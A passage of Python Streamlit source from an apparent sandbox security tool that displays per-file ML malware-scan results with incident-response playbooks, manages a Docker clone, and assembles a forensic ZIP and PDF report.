    Shows: per-file ML prediction + IR playbook.
    """
    from core.source_clone import SANDBOX_ROOT
    clone_id = result.get("clone_id", "")
    sandbox  = SANDBOX_ROOT / clone_id if clone_id else None

    st.markdown(_sec_header("ml", "ML Malware Analysis"), unsafe_allow_html=True)

    # ── Model info header ────────────────────────────────────────
    st.markdown(f"""
<div style="background:#EFF6FF;border:1px solid #BFDBFE;border-radius:12px;
            padding:14px 18px;margin-bottom:16px;display:flex;gap:16px;
            align-items:flex-start;flex-wrap:wrap">
  <div style="flex:2;min-width:260px">
    <div style="font-weight:700;color:{RB};font-size:.85rem;margin-bottom:4px">
      🧠 AI-DTCTM MalwareML v1
    </div>
    <div style="font-size:.78rem;color:{TXS};line-height:1.6">
      Algorithm: <b>20-stump weighted ensemble</b> (pure numpy — embedded model)<br>
      Features: <b>10 static-analysis features</b> per file<br>
      Training reference: EMBER v2 · MalwareBazaar · CIC-MalMem-2022 · BODMAS · UNSW-NB15
    </div>
  </div>
  <div style="flex:1;min-width:160px;font-size:.75rem;color:{TXS}">
    <b>Detects:</b><br>
    EICAR test virus · PHP Webshell<br>
    Dropper · Backdoor · Cryptominer<br>
    Ransomware · Obfuscated malware
  </div>
</div>""", unsafe_allow_html=True)

    col_scan, col_full = st.columns([1, 2])

    with col_scan:
        # ── Scan buttons ─────────────────────────────────────────
        if st.button("🔬 Scan EICAR Files (ML)", key="dt_ml_eicar",
                     use_container_width=True, type="primary"):
            if sandbox and sandbox.exists():
                results = []
                for fname in ("eicar.txt", "eicar_dropper.php"):
                    fp = sandbox / fname
                    if fp.exists():
                        from core.malware_ml import analyse_file as ml_a
                        results.append(ml_a(str(fp)))
                state["ml_results"] = results
                st.rerun()
            else:
                st.warning("Inject EICAR first (click EICAR Inject button).")

        if st.button("🧬 Full Sandbox ML Scan", key="dt_ml_full",
                     use_container_width=True):
            if sandbox and sandbox.exists():
                with st.spinner("Running ML scan on all sandbox files…"):
                    from core.malware_ml import analyse_sandbox as ml_sandbox
                    full = ml_sandbox(str(sandbox), max_files=40)
                    state["ml_sandbox"] = full
                    state["ml_results"] = full.get("results", [])
                st.rerun()
            else:
                st.warning("No sandbox found. Upload a ZIP first.")

    with col_full:
        # ── Sandbox summary (if full scan done) ─────────────────
        sb = state.get("ml_sandbox")
        if sb:
            threat = sb.get("threat_level", "CLEAN")
            tcolor = {"CRITICAL":"#991B1B","HIGH":"#B91C1C","MEDIUM":"#D97706",
                      "LOW":"#2563EB","CLEAN":"#16A34A"}.get(threat,"#64748B")
            st.markdown(f"""
<div style="background:{tcolor}18;border:1.5px solid {tcolor}40;border-radius:10px;
            padding:12px 16px;font-size:.82rem">
  <b style="color:{tcolor}">Overall Threat: {threat}</b><br>
  Files scanned: {sb.get("files_scanned",0)} &nbsp;|&nbsp;
  Malicious: <b>{sb.get("malicious_count",0)}</b> &nbsp;|&nbsp;
  Benign: {sb.get("benign_count",0)}&nbsp;|&nbsp;
  Max risk: {sb.get("max_risk",0)}/100
</div>""", unsafe_allow_html=True)

    # ── Per-file results ──────────────────────────────────────────
    ml_results = state.get("ml_results", [])
    if not ml_results:
        st.info("💡 Click **Scan EICAR Files** after EICAR injection, or **Full Sandbox Scan** to run ML on all files.")
        return

    for r in ml_results[:15]:
        fam    = r.get("family", {})
        fcolor = fam.get("color", "#64748B")
        fbg    = fam.get("bg", "#F8FAFC")
        fname  = r.get("filename", "unknown")
        prob   = r.get("malicious_prob", 0)
        risk   = r.get("risk_score", 0)
        label  = r.get("label", "benign")
        fam_name = fam.get("name", "Unknown")
        risk_label = fam.get("risk", "?")
        icon   = fam.get("icon", "📄")

        # Risk bar colour
        bar_color = ("#DC2626" if risk >= 70 else "#F59E0B" if risk >= 40
                     else "#16A34A" if risk < 15 else "#2563EB")

        with st.expander(
            f"{icon}  {fname}   [{risk_label}]  risk={risk}/100  "
            f"prob={prob:.2f}  →  {fam_name}",
            expanded=(label == "malicious"),
        ):
            c1, c2 = st.columns([1, 1])
            with c1:
                st.markdown(f"""
<div style="background:{fbg};border:1.5px solid {fcolor}40;border-radius:10px;
            padding:12px;font-size:.8rem">
  <b style="color:{fcolor}">{icon} {fam_name}</b><br>
  {fam.get('description','')}<br><br>
  <b>Risk score:</b> {risk}/100<br>
  <b>Malicious prob:</b> {prob:.3f}<br>
  <b>SHA256:</b> <code style="font-size:.65rem">{r.get('sha256','?')[:24]}…</code><br>
  <b>MD5:</b> <code style="font-size:.65rem">{r.get('md5','?')}</code><br>
  <b>Size:</b> {r.get('size_kb',0):.1f} KB
</div>""", unsafe_allow_html=True)

                # Risk bar
                st.markdown(f"""
<div style="margin-top:10px">
  <div style="font-size:.7rem;color:{TXS};margin-bottom:3px">Risk Score</div>
  <div style="background:#E5E7EB;border-radius:6px;height:12px;overflow:hidden">
    <div style="width:{risk}%;background:{bar_color};height:100%;
                border-radius:6px;transition:width 1s"></div>
  </div>
  <div style="font-size:.7rem;text-align:right;color:{fcolor};font-weight:700">
    {risk}/100
  </div>
</div>""", unsafe_allow_html=True)

            with c2:
                # Feature breakdown
                features = r.get("features", {})
                st.markdown(f"""
<div style="font-size:.78rem;color:{TXS}">
  <b>Static Analysis Features:</b>
  <table style="width:100%;margin-top:6px;border-collapse:collapse">
  {''.join(
    f'<tr><td style="padding:2px 0;color:#374151">{k.replace("_"," ").title()}</td>'
    f'<td style="text-align:right;font-family:monospace;color:{RB}">{v}</td></tr>'
    for k, v in features.items()
  )}
  </table>
</div>""", unsafe_allow_html=True)

                # Signature matches
                sigs = r.get("sig_matches", [])
                if sigs:
                    st.markdown(
                        "<div style='margin-top:8px;font-size:.75rem'>"
                        "<b>Signatures Matched:</b><br>"
                        + "".join(
                            f'<span style="background:#FEF2F2;color:#991B1B;'
                            f'border-radius:4px;padding:2px 6px;margin:2px;'
                            f'display:inline-block;font-size:.7rem">'
                            f'⚠ {s[0]}</span>'
                            for s in sigs[:6]
                        )
                        + "</div>",
                        unsafe_allow_html=True,
                    )

                # Top ML signals
                signals = r.get("top_signals", [])
                if signals:
                    st.markdown(
                        "<div style='margin-top:8px;font-size:.72rem;color:#6B7280'>"
                        "<b>ML Confidence Signals:</b><br>"
                        + "<br>".join(f"• {s}" for s in signals[:3])
                        + "</div>",
                        unsafe_allow_html=True,
                    )

            # ── IR Playbook ──────────────────────────────────────
            if label == "malicious":
                fam_lbl = fam.get("label", "benign")
                from core.malware_ml import get_ir_playbook
                ir = get_ir_playbook(fam_lbl)
                if ir.get("phases"):
                    st.markdown(f"""
<div style="background:#FFFBEB;border-left:4px solid #F59E0B;border-radius:0 10px 10px 0;
            padding:12px 16px;margin-top:12px">
  <div style="font-weight:700;color:#92400E;font-size:.84rem;margin-bottom:4px">
    🚨 Incident Response Playbook — {ir['title']}
  </div>
  <div style="font-size:.77rem;color:#78350F;margin-bottom:10px">
    {ir['summary']}
  </div>
""", unsafe_allow_html=True)
                    for phase in ir["phases"]:
                        st.markdown(f"""
  <div style="margin-bottom:8px">
    <div style="font-weight:700;color:#374151;font-size:.8rem">
      {phase['icon']} {phase['phase']}
    </div>
    <ul style="margin:4px 0 0 16px;padding:0;font-size:.75rem;color:#4B5563">
      {''.join(f'<li>{step}</li>' for step in phase['steps'])}
    </ul>
  </div>""", unsafe_allow_html=True)

                    mitre = ir.get("mitre", [])
                    datasets = ir.get("datasets", [])
                    if mitre:
                        st.markdown(
                            "<div style='font-size:.72rem;color:#6B7280;margin-top:6px'>"
                            "<b>MITRE ATT&CK:</b> "
                            + " · ".join(f"<code>{m}</code>" for m in mitre)
                            + "</div>",
                            unsafe_allow_html=True,
                        )
                    if datasets:
                        st.markdown(
                            "<div style='font-size:.72rem;color:#6B7280'>"
                            "<b>Reference Datasets:</b> "
                            + " · ".join(datasets)
                            + "</div>",
                            unsafe_allow_html=True,
                        )
                    st.markdown("</div>", unsafe_allow_html=True)


# ─────────────────────────────────────────────────────────────────────
#  DESTROY CLONE
# ─────────────────────────────────────────────────────────────────────
def _render_destroy(state: dict, result: dict) -> None:
    with st.expander("🗑 Destroy clone container", expanded=False):
        cname = result.get("container_name", "")
        st.warning(
            f"This will stop and remove `{cname}` and delete all sandbox files. "
            f"Your original uploaded ZIP is safe."
        )
        if st.button("🗑 Destroy Docker Clone Now", key="dt_destroy", type="secondary"):
            clone_id = result.get("clone_id", "")
            if clone_id:
                try:
                    from core.source_clone import destroy_clone
                    ok = destroy_clone(clone_id, remove_sandbox=True)
                    if ok:
                        st.success(f"✅ Clone `{clone_id}` destroyed.")
                        state["clone_result"] = None
                        job_id = state.get("job_id","")
                        if job_id in _JOBS:
                            del _JOBS[job_id]
                        st.rerun()
                    else:
                        st.error("Destroy failed — check Docker logs.")
                except Exception as exc:
                    st.error(f"Error: {exc}")


# ─────────────────────────────────────────────────────────────────────
#  FORENSIC DOWNLOAD  (original + clone zip + PDF report + manifest)
# ─────────────────────────────────────────────────────────────────────
def _render_download(state: dict, result: dict) -> None:
    scan       = state.get("scan", {})
    n_find     = scan.get("total_findings", 0) + scan.get("deep_total", 0)
    atk_n      = len(state.get("attack_log", []))
    clone_id   = result.get("clone_id", "")
    fname_base = state["filename"].replace(".zip", "")

    st.markdown(_sec_header("download", "Forensic Download Package"), unsafe_allow_html=True)
    st.markdown(f"""
<div class="dt-dl">
  <div class="dt-dl-title">📦 Download Forensic Package</div>
  <div class="dt-dl-sub">
    <b>Contents:</b> original.zip · clone.zip (live sandbox export) ·
    Dockerfile · docker-compose.yml · manifest.json ·
    scan_report.json · <b>forensic_report.pdf</b><br>
    <b>Findings:</b> {n_find} security issues &nbsp;·&nbsp;
    <b>Attacks:</b> {atk_n} events logged &nbsp;·&nbsp;
    <b>Container:</b> {result.get('container_name','N/A')} ·
    Port {result.get('host_port','?')}
  </div>
</div>""", unsafe_allow_html=True)

    c1, c2, c3 = st.columns(3)
    with c1:
        # Clone code = current LIVE state → covers "clone only", "edit+save",
        # and "after attack" (injected files are exported too).
        clone_zip = None
        try:
            from core.source_clone import download_clone_as_zip
            clone_zip = download_clone_as_zip(clone_id) if clone_id else None
        except Exception:
            clone_zip = None
        st.download_button(
            label="⬇ Clone code (.zip)",
            data=clone_zip or b"",
            file_name=f"clone_{fname_base}_{int(time.time())}.zip",
            mime="application/zip",
            key="dt_dl_clone",
            type="primary",
            use_container_width=True,
            disabled=(clone_zip is None),
            help="Current live clone — includes your saved edits + any injected files from attacks",
        )
    with c2:
        pkg = _build_forensic_package(state, result)
        st.download_button(
            label="⬇ Forensic package",
            data=pkg,
            file_name=f"forensic_{fname_base}_{int(time.time())}.zip",
            mime="application/zip",
            key="dt_dl_btn",
            use_container_width=True,
            help="Original + clone + Dockerfile + scan report + PDF",
        )
    with c3:
        # Edited-files-only export (what the user changed in the workbench)
        edits = state.get("saved_edits", {})
        if edits:
            ebuf = io.BytesIO()
            with zipfile.ZipFile(ebuf, "w", zipfile.ZIP_DEFLATED) as zf:
                for rel, content in edits.items():
                    zf.writestr(rel, content)
            st.download_button(
                label=f"⬇ My edits ({len(edits)})",
                data=ebuf.getvalue(),
                file_name=f"edits_{fname_base}_{int(time.time())}.zip",
                mime="application/zip",
                key="dt_dl_edits",
                use_container_width=True,
                help="Only the files you edited and saved",
            )
        else:
            st.caption("Edit + Save files to enable an edits-only export")


def _build_forensic_package(state: dict, result: dict) -> bytes:
    """
    Assemble the complete forensic ZIP:
      original/<filename>         — user's original upload
      clone/                      — live sandbox export (download_clone_as_zip)
      docker/Dockerfile           — generated Dockerfile
      docker/docker-compose.yml
      manifest.json               — case metadata
      scan_report.json            — all findings + attack log
      forensic_report.pdf         — professional reportlab PDF
    """
    buf = io.BytesIO()
    scan     = state.get("scan", {})
    manifest = {
        "tool":            "AI-DTCTM Digital Twin v5",
        "created":         time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "source":          state["filename"],
        "clone_id":        result.get("clone_id", ""),
        "container":       result.get("container_name", ""),
        "url":             result.get("url", ""),
        "host_port":       result.get("host_port", ""),
        "stack":           result.get("stack", {}),
        "files_extracted": len(state.get("files", [])),
        "forensic_findings": scan.get("total_findings", 0),
        "deep_findings":     scan.get("deep_total", 0),
        "attack_events":     len(state.get("attack_log", [])),
        "eicar_injected":    bool(state.get("eicar_state")),
    }

    dockerfile = result.get("dockerfile", "# Dockerfile not captured")
    dc_yml = (
        "version: '3'\nservices:\n  clone:\n"
        f"    image: aidtctm_clone_{result.get('clone_id','')}\n"
        f"    ports:\n      - \"{result.get('host_port','8090')}:80\"\n"
        "networks:\n  twin_net:\n    internal: true\n"
    )

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # 1. Original ZIP
        zp = state.get("zip_path", "")
        if os.path.exists(zp):
            zf.write(zp, f"original/{state['filename']}")

        # 2. Clone sandbox ZIP (real export via download_clone_as_zip)
        clone_id = result.get("clone_id", "")
        if clone_id:
            try:
                from core.source_clone import download_clone_as_zip
                clone_bytes = download_clone_as_zip(clone_id)
                if clone_bytes:
                    zf.writestr(f"clone/{clone_id}_sandbox.zip", clone_bytes)
            except Exception:
                # Fallback: pack local extract
                for f in state.get("files", []):
                    try:
                        zf.write(f["path"], f"clone/{f['rel']}")
                    except Exception:
                        pass

        # 3. Docker artifacts
        zf.writestr("docker/Dockerfile", dockerfile)
        zf.writestr("docker/docker-compose.yml", dc_yml)

        # 4. Manifest
        zf.writestr("manifest.json", json.dumps(manifest, indent=2))

        # 5. Scan report JSON
        zf.writestr("scan_report.json", json.dumps({
            "manifest":      manifest,
            "per_file_scan": scan.get("per_file", []),
            "deep_scan":     scan.get("deep", {}),
            "attack_log":    state.get("attack_log", []),
            "eicar_state":   state.get("eicar_state"),
        }, indent=2, default=str))

        # 6. Professional PDF report
        pdf_bytes = _generate_forensic_pdf(state, result, manifest)
        if pdf_bytes:
            zf.writestr("forensic_report.pdf", pdf_bytes)

    return buf.getvalue()


def _generate_forensic_pdf(
    state: dict, result: dict, manifest: dict
) -> Optional[bytes]:
    """
    Generate a professional PDF forensic report using reportlab
    (same library used in pg_admin._gen_pdf).
    """
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.lib.styles import ParagraphStyle
        from reportlab.lib.units import inch
        from reportlab.lib import colors
        from reportlab.platypus import (
            SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable,
        )
    except ImportError:
        return None  # reportlab not installed

    buf = io.BytesIO()
    doc = SimpleDocTemplate(
        buf, pagesize=letter,
        rightMargin=0.65*inch, leftMargin=0.65*inch,
        topMargin=0.65*inch,   bottomMargin=0.55*inch,
    )

    BLUE  = colors.HexColor("#2563EB")
    DARK  = colors.HexColor("#0F172A")
    GREY  = colors.HexColor("#64748B")
    LGREY = colors.HexColor("#F1F5F9")
    CRIT  = colors.HexColor("#DC2626")
    HIGH  = colors.HexColor("#EA580C")
    MED   = colors.HexColor("#D97706")
    LOW   = colors.HexColor("#2563EB")

    sev_color = {"CRITICAL": CRIT, "HIGH": HIGH, "MEDIUM": MED, "LOW": LOW}

    T  = ParagraphStyle("T", fontName="Helvetica-Bold", fontSize=20,
                        textColor=DARK, spaceAfter=4)
    SU = ParagraphStyle("SU", fontName="Helvetica", fontSize=10,
                        textColor=GREY, spaceAfter=16)
    H  = ParagraphStyle("H", fontName="Helvetica-Bold", fontSize=13,
                        textColor=BLUE, spaceBefore=14, spaceAfter=6)
    B  = ParagraphStyle("B", fontName="Helvetica", fontSize=10,
                        textColor=colors.HexColor("#334155"),
                        spaceAfter=4, leading=15)
    CO = ParagraphStyle("CO", fontName="Courier", fontSize=8,
                        textColor=colors.HexColor("#1E293B"),
                        backColor=LGREY, spaceAfter=2)

    story: list = []

    # ── Title ────────────────────────────────────────────────────
    story.append(Paragraph("AI-DTCTM Digital Twin Forensic Report", T))
    story.append(Paragraph(
        f"Generated: {manifest['created']}  ·  "
        f"Source: {manifest['source']}  ·  "
        f"Clone: {manifest['clone_id'] or 'N/A'}",
        SU,
    ))
    story.append(HRFlowable(width="100%", thickness=1.5,
                             color=BLUE, spaceAfter=12))

    # ── Executive Summary ────────────────────────────────────────
    story.append(Paragraph("Executive Summary", H))
    scan = state.get("scan", {})
    story.append(Paragraph(
        f"A digital twin of <b>{manifest['source']}</b> was cloned into an isolated "
        f"Docker container (<b>{manifest.get('container','N/A')}</b>) running at "
        f"<b>{manifest.get('url','N/A')}</b>. "
        f"Static analysis detected <b>{manifest['forensic_findings'] + manifest['deep_findings']}</b> "
        f"security findings. "
        f"<b>{manifest['attack_events']}</b> real HTTP attack events were executed against the replica. "
        f"{'EICAR AV-test signatures were injected into the sandbox. ' if manifest['eicar_injected'] else ''}"
        f"The original source remains unmodified.",
        B,
    ))

    # ── Clone Metadata ───────────────────────────────────────────
    story.append(Paragraph("Clone Metadata", H))
    stack = manifest.get("stack", {})
    meta_rows = [
        ["Clone ID",   manifest.get("clone_id", "N/A")],
        ["Container",  manifest.get("container", "N/A")],
        ["URL",        manifest.get("url", "N/A")],
        ["Port",       str(manifest.get("host_port", "N/A"))],
        ["Stack",      f"{stack.get('language','?')} / {stack.get('framework','?')}"],
        ["Files",      str(manifest.get("files_extracted", 0))],
        ["EICAR",      "Injected" if manifest["eicar_injected"] else "Not injected"],
    ]
    meta_tbl = Table(meta_rows, colWidths=[1.4*inch, 5.0*inch])
    meta_tbl.setStyle(TableStyle([
        ("FONTNAME",   (0,0), (0,-1), "Helvetica-Bold"),
        ("FONTSIZE",   (0,0), (-1,-1), 9),
        ("TEXTCOLOR",  (0,0), (0,-1), GREY),
        ("TEXTCOLOR",  (1,0), (1,-1), DARK),
        ("ROWBACKGROUNDS", (0,0), (-1,-1), [LGREY, colors.white]),
        ("GRID",       (0,0), (-1,-1), 0.25, colors.HexColor("#E2E8F0")),
        ("LEFTPADDING",(0,0),(-1,-1),8),
        ("RIGHTPADDING",(0,0),(-1,-1),8),
        ("TOPPADDING", (0,0),(-1,-1),5),
        ("BOTTOMPADDING",(0,0),(-1,-1),5),
    ]))
    story.append(meta_tbl)
    story.append(Spacer(1, 10))

    # ── Forensic Findings ────────────────────────────────────────
    per_file = scan.get("per_file", [])
    deep_fi  = scan.get("deep", {}).get("findings", [])

    if per_file or deep_fi:
        story.append(Paragraph(
            f"Security Findings ({len(per_file)} files · "
            f"{scan.get('total_findings',0)} pattern + "
            f"{scan.get('deep_total',0)} deep)", H
        ))
        # Severity summary table
        by_sev = scan.get("deep", {}).get("by_severity", {})
        sev_rows = [["Severity", "Count"]]
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            n = by_sev.get(sev, 0) + sum(
                1 for r in per_file for fi in r.get("findings", [])
                if fi.get("severity") == sev
            )
            if n:
                sev_rows.append([sev, str(n)])
        if len(sev_rows) > 1:
            st_tbl = Table(sev_rows, colWidths=[1.5*inch, 1*inch])
            st_tbl.setStyle(TableStyle([
                ("BACKGROUND",  (0,0), (-1,0), BLUE),
                ("TEXTCOLOR",   (0,0), (-1,0), colors.white),
                ("FONTNAME",    (0,0), (-1,0), "Helvetica-Bold"),
                ("FONTSIZE",    (0,0), (-1,-1), 9),
                ("GRID",        (0,0), (-1,-1), 0.25, colors.HexColor("#E2E8F0")),
                ("ALIGN",       (1,0), (1,-1), "CENTER"),
                ("LEFTPADDING", (0,0),(-1,-1),8),
                ("TOPPADDING",  (0,0),(-1,-1),4),
                ("BOTTOMPADDING",(0,0),(-1,-1),4),
            ]))
            story.append(st_tbl)
            story.append(Spacer(1, 8))

        # Top findings detail
        all_findings = [
            (os.path.basename(r.get("file","")), fi)
            for r in per_file for fi in r.get("findings", [])
        ] + [
            (os.path.basename(fi.get("file","")), fi)
            for fi in deep_fi
        ]
        all_findings.sort(
            key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW"].index(
                x[1].get("severity","LOW")
            ) if x[1].get("severity") in ["CRITICAL","HIGH","MEDIUM","LOW"] else 99
        )
        if all_findings:
            fi_rows = [["Severity", "File", "Category", "Line", "Description"]]
            for fname, fi in all_findings[:30]:
                sev = fi.get("severity", "LOW")
                fi_rows.append([
                    sev,
                    fname[:20],
                    fi.get("category", fi.get("rule",""))[:22],
                    str(fi.get("line","?")),
                    (fi.get("description", fi.get("detail","")) or "")[:50],
                ])
            fi_tbl = Table(
                fi_rows,
                colWidths=[0.85*inch, 1.1*inch, 1.4*inch, 0.45*inch, 2.6*inch],
            )
            sev_styles = []
            for row_i, (_, fi) in enumerate(all_findings[:30], start=1):
                sev = fi.get("severity","LOW")
                c = sev_color.get(sev, LOW)
                sev_styles.append(("TEXTCOLOR", (0,row_i),(0,row_i), c))
            fi_tbl.setStyle(TableStyle([
                ("BACKGROUND",   (0,0),(-1,0), BLUE),
                ("TEXTCOLOR",    (0,0),(-1,0), colors.white),
                ("FONTNAME",     (0,0),(-1,0), "Helvetica-Bold"),
                ("FONTSIZE",     (0,0),(-1,-1), 7.5),
                ("ROWBACKGROUNDS",(0,1),(-1,-1),[colors.white, LGREY]),
                ("GRID",         (0,0),(-1,-1), 0.25, colors.HexColor("#E2E8F0")),
                ("LEFTPADDING",  (0,0),(-1,-1), 5),
                ("RIGHTPADDING", (0,0),(-1,-1), 5),
                ("TOPPADDING",   (0,0),(-1,-1), 3),
                ("BOTTOMPADDING",(0,0),(-1,-1), 3),
                ("WORDWRAP",     (4,0),(4,-1), True),
            ] + sev_styles))
            story.append(fi_tbl)

    # ── Attack Log ───────────────────────────────────────────────
    attack_log = state.get("attack_log", [])
    if attack_log:
        story.append(Spacer(1, 10))
        story.append(Paragraph(f"Attack Log ({len(attack_log)} events)", H))
        for entry in attack_log[:50]:
            typ  = entry.get("type", "info")
            txt  = entry.get("text", "")
            ts   = entry.get("ts", "")
            color_map = {
                "ok": colors.HexColor("#16A34A"),
                "err": CRIT, "crit": CRIT,
                "warn": MED, "info": DARK,
            }
            c = color_map.get(typ, DARK)
            style = ParagraphStyle(
                "AL", fontName="Courier", fontSize=8,
                textColor=c, spaceAfter=1, leading=12,
            )
            story.append(Paragraph(f"[{ts}] {txt}", style))

    # ── Footer ───────────────────────────────────────────────────
    story.append(Spacer(1, 18))
    story.append(HRFlowable(width="100%", thickness=0.5,
                             color=GREY, spaceAfter=6))
    story.append(Paragraph(
        f"AI-DTCTM · Digital Twin Forensic Report · "
        f"{manifest['created']} · Original file: {manifest['source']}",
        ParagraphStyle("F", fontName="Helvetica", fontSize=7.5,
                       textColor=GREY, spaceAfter=0),
    ))

    try:
        doc.build(story)
        return buf.getvalue()
    except Exception:
        return None
